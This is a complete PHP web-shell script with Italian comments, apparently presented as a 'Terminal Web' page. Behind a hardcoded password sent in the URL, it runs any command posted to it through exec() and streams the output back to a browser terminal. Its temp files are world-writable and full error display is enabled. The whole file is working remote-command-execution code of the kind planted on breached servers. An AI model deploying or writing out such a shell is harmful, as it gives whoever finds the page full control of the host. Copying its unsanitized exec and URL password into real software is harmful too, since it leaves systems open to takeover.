<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if(!isset($_GET['pwd']) || $_GET['pwd'] != 'fdisbf343q$£$(5') exit;

session_start();

// Directory temporanea per i file di processo
$processDir = sys_get_temp_dir() . '/terminal_processes';
if (!file_exists($processDir)) {
    mkdir($processDir, 0777, true);
}

// Gestione dell'avvio di un nuovo comando
if (isset($_POST['command'])) {
    header('Content-Type: application/json');
    
    $command = $_POST['command'];
    $processId = uniqid();
    $outputFile = "$processDir/$processId.out";
    $pidFile = "$processDir/$processId.pid";
    
    // Esegui il comando reindirizzando l'output su file
    $fullCommand = "$command > $outputFile 2>&1 & echo $! > $pidFile";
    exec($fullCommand);
    
    if (file_exists($pidFile)) {
        echo json_encode([
            'processId' => $processId,
            'status' => 'started'
        ]);
    } else {
        echo json_encode(['error' => 'Failed to execute command']);
    }
    exit;
}

// Gestione del polling per l'output
if (isset($_POST['poll']) && isset($_POST['processId'])) {
    header('Content-Type: application/json');
    
    $processId = $_POST['processId'];
    $outputFile = "$processDir/$processId.out";
    $pidFile = "$processDir/$processId.pid";
    
    if (!file_exists($pidFile)) {
        echo json_encode(['error' => 'Process not found']);
        exit;
    }
    
    $pid = (int)file_get_contents($pidFile);
    $isRunning = file_exists("/proc/$pid");
    
    // Leggi l'output dal file
    $output = '';
    if (file_exists($outputFile)) {
        $output = file_get_contents($outputFile);
        // Pulisci il file per il prossimo polling
        file_put_contents($outputFile, '');
    }
    
    if (!$isRunning) {
        // Pulisci i file quando il processo termina
        @unlink($outputFile);
        @unlink($pidFile);
    }
    
    echo json_encode([
        'output' => $output,
        'isRunning' => $isRunning
    ]);
    exit;
}

// Pulizia dei file vecchi (più di 5 minuti)
$files = glob("$processDir/*");
foreach ($files as $file) {
    if (time() - filemtime($file) > 300) {
        @unlink($file);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Terminal Web</title>
    <style>
        #terminal {
            background: black;
            color: #00ff00;
            font-family: monospace;
            padding: 10px;
            height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            margin-bottom: 10px;
        }
        #command {
            width: 100%;
            padding: 5px;
            margin-top: 10px;
            font-family: monospace;
        }
        .error-text {
            color: #ff0000;
        }
        .command-text {
            color: #00ffff;
        }
    </style>
</head>
<body>
    <div id="terminal"></div>
    <input type="text" id="command" placeholder="Inserisci un comando...">

    <script>
        const terminal = document.getElementById('terminal');
        const commandInput = document.getElementById('command');
        let currentProcessId = null;
        let pollingInterval = null;

        function appendToTerminal(text, isError = false, isCommand = false) {
            const span = document.createElement('span');
            span.textContent = text + '\n';
            if (isError) {
                span.className = 'error-text';
            } else if (isCommand) {
                span.className = 'command-text';
            }
            terminal.appendChild(span);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function pollOutput(processId) {
            const formData = new FormData();
            formData.append('poll', '1');
            formData.append('processId', processId);

            fetch(window.location.href, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    appendToTerminal(data.error, true);
                    stopPolling();
                    return;
                }

                if (data.output) {
                    appendToTerminal(data.output);
                }

                if (!data.isRunning) {
                    stopPolling();
                }
            })
            .catch(error => {
                appendToTerminal(`Errore: ${error.message}`, true);
                stopPolling();
            });
        }

        function stopPolling() {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
            currentProcessId = null;
            commandInput.disabled = false;
        }

        function executeCommand(command) {
            const formData = new FormData();
            formData.append('command', command);

            appendToTerminal(`$ ${command}`, false, true);
            commandInput.disabled = true;

            fetch(window.location.href, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    appendToTerminal(data.error, true);
                    commandInput.disabled = false;
                    return;
                }

                currentProcessId = data.processId;
                pollingInterval = setInterval(() => {
                    pollOutput(currentProcessId);
                }, 100); // Poll ogni 100ms
            })
            .catch(error => {
                appendToTerminal(`Errore: ${error.message}`, true);
                commandInput.disabled = false;
            });
        }

        commandInput.addEventListener('keypress', (event) => {
            if (event.key === 'Enter') {
                const command = commandInput.value;
                if (command.trim()) {
                    executeCommand(command);
                    commandInput.value = '';
                }
            }
        });

        // Messaggio iniziale
        appendToTerminal('Terminal Web pronto. Inserisci un comando...');
    </script>
</body>
</html>